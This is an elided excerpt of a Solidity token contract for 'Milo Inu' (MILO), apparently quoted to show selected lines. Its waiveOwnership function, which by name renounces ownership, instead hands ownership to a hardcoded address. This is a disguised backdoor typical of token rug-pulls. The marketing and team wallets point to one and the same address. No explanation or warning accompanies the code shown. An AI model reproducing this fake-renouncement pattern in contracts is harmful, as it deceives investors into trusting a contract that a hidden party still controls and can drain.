...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xe95DdeeA8316091867aD1b11d891017b5910C558);
    }
...
contract MiloInu is Context, IERC20, Ownable {
    ...
    string private _name = "Milo Inu";
    string private _symbol = "MILO";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x4848c247Aa4bd9f30ab5807EbDDD2830F092b076);
    address payable private teamWalletAddress = payable(0x4848c247Aa4bd9f30ab5807EbDDD2830F092b076);
